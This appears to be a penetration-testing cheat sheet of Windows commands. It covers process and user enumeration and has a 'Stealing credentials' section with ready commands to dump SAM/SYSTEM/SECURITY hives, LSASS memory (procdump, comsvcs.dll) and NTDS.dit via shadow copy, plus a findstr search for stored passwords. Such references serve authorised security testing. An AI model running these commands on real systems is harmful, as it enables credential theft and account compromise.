# Windows

## Applications, processes, and services

### Show running processes

```batch title="cmd.exe"
tasklist
tasklist /svc
```

```powershell title="PowerShell"
Get-Process
Get-Process <process> # the name must be exact
```

**External resources:**

- [`tasklist` Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist)
- [`Get-Process` Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process)

## Users and groups

### Current user security privileges

```batch title="cmd.exe"
whoami /priv
```

### Current user local groups

```batch title="cmd.exe"
net localgroup
```

## Stealing credentials

### Dumping registry hives

```batch title="cmd.exe"
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

### Dumping LSASS memory

```batch title="cmd.exe"
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```batch title="cmd.exe (Cloned Process)"
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

```batch title="cmd.exe (comsvcs.dll)"
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

### Copying NTDS.dit

```powershell title="Create shadow copy and copy NTDS.dit"
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## File System

### Find files by content

```batch title="Search for 'password' using findstr"
findstr /sim /c:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

:::info Command explanation

- `/s` searches for matching files in the current directory and all subdirectories
- `/i` makes the search case-insensitive
- `/m` only prints the file names of matching files
- `/c` specifies the string to search for

:::

**External resources:**

- [`findstr` Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)